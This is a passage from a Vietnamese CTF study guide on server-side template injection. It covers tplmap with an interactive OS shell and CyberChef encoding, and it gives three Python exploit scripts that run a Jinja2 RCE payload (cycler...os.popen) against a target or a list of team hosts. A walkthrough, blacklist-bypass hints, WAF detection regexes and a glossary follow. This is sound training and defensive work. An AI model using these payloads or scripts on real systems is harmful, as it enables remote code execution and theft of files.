+  <code>Python.md</code> (Jinja2/Mako/Tornado), <code>PHP.md</code> (Twig/Smarty), <code>Java.md</code>
+  (Freemarker/Velocity/Thymeleaf), <code>JavaScript.md</code> (EJS/Nunjucks/Handlebars/Pug),
+  <code>Ruby.md</code> (ERB/Slim), <code>ASP.md</code>. Có cả <code>Intruder/</code> wordlist để fuzz payload dò
+  engine hàng loạt qua Burp Intruder thay vì gõ tay từng cái ở mục 04.</p>
+
+  <h3>B. tplmap — tự động dò engine và khai thác</h3>
+  <div class="def"><b>tplmap</b> — công cụ tương đương sqlmap/commix nhưng cho SSTI: đưa nó 1 URL/request, nó tự
+  thử payload dò của nhiều engine, tự xác định đúng engine, rồi có thể mở shell tương tác. Đã clone về
+  <code>~/hoc/CTF/Tools/web/tplmap/</code> (từ <code>epinna/tplmap</code> chính chủ).</div>
+  <div class="note warn"><span class="tag">Thành thật về giới hạn</span>Commit cuối của tplmap là <strong>2021</strong>
+  — khá cũ, có thể không nhận diện được bản vá/thay đổi mới của Jinja2 gần đây (ví dụ sandbox chặn
+  <code>__subclasses__</code> ở một số bản). Dùng để <strong>dò nhanh + gợi ý engine</strong>, nhưng nếu nó báo
+  "not injectable" trong khi bạn chắc chắn có SSTI (đã tự xác nhận bằng <code>{{7*7}}</code>), đừng tin tuyệt đối
+  — quay lại khai thác tay theo mục 06.</div>
+  <pre><code>cd ~/hoc/CTF/Tools/web/tplmap
+python3 tplmap.py -u <span class="s">"http://TARGET/greet?name=test"</span>
+<span class="c"># đã xác nhận -> mở shell tương tác</span>
+python3 tplmap.py -u <span class="s">"http://TARGET/greet?name=test"</span> --os-shell</code></pre>
+
+  <h3>C. CyberChef — hỗ trợ khi payload cần mã hóa/giải mã</h3>
+  <p>Mở <code>~/hoc/CTF/Tools/web/CyberChef/CyberChef_v11.6.0.html</code> (offline, không cần mạng).</p>
+  <table>
+    <tr><th>Tình huống</th><th>Làm gì trong CyberChef</th></tr>
+    <tr><td>Bị chặn chữ <code>__class__</code>/<code>os</code> theo blacklist, cần đổi sang mã hex</td><td>Kéo khối <strong>To Hex</strong> với delimiter <code>\x</code>, dán chuỗi <code>__globals__</code> vào Input để lấy nhanh <code>\x5f\x5fglobals\x5f\x5f</code> thay vì tự tính tay từng ký tự</td></tr>
+    <tr><td>Tìm thấy <code>SECRET_KEY</code> qua <code>{{ config }}</code>, cần giải mã/forge session sau đó</td><td>Dùng kèm bài JWT/session — CyberChef có khối <strong>JWT Decode</strong> để xem nhanh payload token</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+url = <span class="s">"http://TARGET/greet"</span>
+
+<span class="c"># Bước 1: xác nhận SSTI + engine</span>
+r = requests.post(url, data={<span class="s">"name"</span>: <span class="s">"{{7*'7'}}"</span>})
+<span class="k">print</span>(<span class="s">"Jinja2"</span> <span class="k">if</span> <span class="s">"7777777"</span> <span class="k">in</span> r.text <span class="k">else</span> <span class="s">"Không phải Jinja2, thử engine khác"</span>)
+
+<span class="c"># Bước 2: RCE đọc flag</span>
+payload = <span class="s">"{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"</span>
+r = requests.post(url, data={<span class="s">"name"</span>: payload})
+<span class="k">print</span>(r.text)</code></pre>
+
+  <h3>(B) Bản gọn chắc — dùng thực chiến, trích thẳng flag</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+PAYLOAD = <span class="s">"{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"</span>
+
+<span class="k">def</span> <span class="d">exploit_ssti</span>(host):
+    r = requests.post(<span class="s">f"http://{host}/greet"</span>, data={<span class="s">"name"</span>: PAYLOAD}, timeout=5)
+    m = FLAG_RE.search(r.text)
+    <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+
+<span class="k">print</span>(<span class="s">"FLAG:"</span>, exploit_ssti(<span class="s">"TARGET_IP"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+PAYLOAD = <span class="s">"{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"</span>
+
+<span class="k">def</span> <span class="d">exploit_ssti</span>(host):
+    <span class="k">try</span>:
+        r = requests.post(<span class="s">f"http://{host}/greet"</span>, data={<span class="s">"name"</span>: PAYLOAD}, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_ssti(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service Flask, có form "Nhập tên để nhận lời chào cá nhân hóa". Cookie dạng <code>session=eyJ...</code> ⟹ nghi Flask/Jinja2.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Xác nhận</div><div class="d">Burp Repeater, gửi <code>name={{7*7}}</code> → Response "Xin chào, 49!" ⟹ xác nhận SSTI.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Xác định engine</div><div class="d"><code>name={{7*'7'}}</code> → Response "Xin chào, 7777777!" ⟹ đúng Jinja2.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">RCE</div><div class="d"><code>name={{ cycler.__init__.__globals__.os.popen('ls').read() }}</code> → Response hiện danh sách file, thấy <code>flag_x7z.txt</code>.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Đọc flag</div><div class="d"><code>name={{ cycler.__init__.__globals__.os.popen('cat flag_x7z.txt').read() }}</code> → Response hiện <code>FHACKER2026{...}</code>.</div></div></div>
+    <div class="srow"><span class="n">6</span><div><div class="t">Tự động hóa</div><div class="d">Dán payload vào script (C) mục 08, chạy qua các đội.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (regex)</th><th>Khớp gì</th></tr>
+    <tr><td><code>\{\{.*(__class__|__globals__|__mro__|__subclasses__|__import__).*\}\}</code></td><td>Chuỗi "đi bộ" qua object Python đặc trưng của Jinja2 RCE</td></tr>
+    <tr><td><code>\{\{.*(cycler|lipsum|joiner).*(popen|system|exec).*\}\}</code></td><td>Payload ngắn qua biến toàn cục sẵn có</td></tr>
+    <tr><td><code>\$\{.*Execute.*\}|&lt;#assign</code></td><td>Payload Freemarker</td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Tránh chặn nhầm</span>Không chặn mọi cặp <code>{{ }}</code> (app có thể
+  dùng chính cú pháp này hợp lệ ở nơi khác, hoặc front-end framework như Vue cũng dùng <code>{{ }}</code>).
+  Luôn test DetectionOnly trước.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi payload không ăn</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td><code>{{7*7}}</code> in nguyên văn, không tính</td><td>Input không đi vào template string, chỉ vào biến dữ liệu thường (app code đúng)</td><td>Không phải SSTI, thử lỗ hổng khác</td></tr>
+    <tr><td><code>{{7*7}}</code> ra 49 nhưng RCE không chạy</td><td>Có thể engine chạy trong sandbox chặn truy cập <code>__class__</code> hoặc tương tự</td><td>Thử nhóm payload ngắn (<code>cycler</code>/<code>lipsum</code>) thay vì <code>__subclasses__()</code> trực tiếp — một số sandbox chỉ chặn 1 trong 2 đường</td></tr>
+    <tr><td>Index trong <code>__subclasses__()[N]</code> sai mỗi lần thử</td><td>Số lượng class đã load thay đổi theo lần chạy/version</td><td>Luôn in danh sách ra trước (bỏ phần gọi, chỉ in <code>__subclasses__()</code>) rồi đếm lại thủ công, hoặc ưu tiên payload qua <code>cycler</code>/<code>lipsum</code> không cần đếm</td></tr>
+    <tr><td>Payload dài bị cắt cụt/lỗi cú pháp</td><td>WAF hoặc chính app giới hạn độ dài input</td><td>Dùng biến trung gian ngắn hơn, hoặc chia payload thành nhiều request nếu app cho lưu state (hiếm)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>App dùng <code>render_template_string(f"...{input}...")</code> hoặc tương đương — ghép input vào CHÍNH template string trước khi compile.</td></tr>
+    <tr><td>❌</td><td>App dùng đúng cách: <code>render_template_string("...{{ name }}...", name=input)</code> — input chỉ là biến dữ liệu, không bao giờ được compile như code, dù bạn gõ gì vào cũng chỉ hiện ra nguyên văn.</td></tr>
+    <tr><td>❌</td><td>Engine chạy trong sandbox nghiêm ngặt (một số bản Jinja2 SandboxedEnvironment chặn hoàn toàn truy cập <code>__class__</code>) — cần tìm gadget khác hoặc chuyển hướng lỗ hổng.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay trên Burp, từ gõ tên thường tới khi đọc được flag.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhớ xác nhận engine bằng <code>{{7*'7'}}</code> trước khi viết payload
+  RCE — tránh phí thời gian thử payload sai engine.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> challenge chặn chữ <code>os</code> theo blacklist từ khóa. Viết payload RCE
+  không chứa nguyên văn chữ <code>os</code>.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Dùng <code>__builtins__['__import__']('os')</code> thay vì gọi trực
+  tiếp <code>.os</code>.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> challenge là Freemarker (Java), có WAF chặn chữ <code>Execute</code>. Tìm
+  payload Freemarker RCE khác không dùng class đó.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Tra <code>Java.md</code> trong PayloadsAllTheThings — có nhiều class
+  Java khác ngoài <code>freemarker.template.utility.Execute</code> cũng dẫn tới RCE.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Template engine</td><td>Chương trình biên dịch khuôn mẫu HTML có chỗ trống thành trang hoàn chỉnh.</td></tr>
+    <tr><td><code>__class__</code>, <code>__mro__</code>, <code>__subclasses__</code></td><td>Thuộc tính/hàm có sẵn trên mọi object Python, dùng để "đi bộ" từ 1 giá trị tới các class khác đã nạp trong bộ nhớ.</td></tr>
+    <tr><td>Sandbox (template)</td><td>Chế độ engine giới hạn những gì code trong <code>{{ }}</code> được phép làm, nhằm chống chính kiểu tấn công này.</td></tr>
+    <tr><td>Gadget</td><td>Một đường/kỹ thuật cụ thể để đi từ chỗ kiểm soát được tới RCE, khi đường thông thường bị chặn.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong>
+  <code>~/hoc/CTF/Tools/web/tplmap/</code>, <code>~/hoc/CTF/Tools/web/CyberChef/</code>,
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Server Side Template Injection/</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("ssti-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("ssti-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
